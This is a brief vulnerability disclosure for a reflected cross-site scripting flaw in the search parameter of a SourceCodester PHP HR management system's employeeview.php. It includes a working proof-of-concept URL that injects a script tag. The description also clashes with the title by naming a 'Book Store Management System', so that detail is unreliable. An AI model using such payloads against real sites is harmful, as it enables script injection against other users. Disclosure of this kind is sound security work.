# Human Resource Management System 1.0 Reflected XSS

Description: Vulnerability was found in SourceCodester Book Store Management System 1.0. A Reflected cross-site scripting (XSS) vulnerability in /hrm/employeeview.php with search handler.

The product(s): https://www.sourcecodester.com/php/15740/human-resource-management-system-project-php-and-mysql-free-source-code.html

Affected product(s)/code base: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hrm.zip

Affected component(s): /hrm/employeeview.php

Proof of Concept:

http://localhost/hrm/employeeview.php?searchview=Submit+Query&search=sss%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cinput

![](images/xss-confirm.png)

#### Discoverer(s)/Credits: NGO VAN TU (@leecybersec)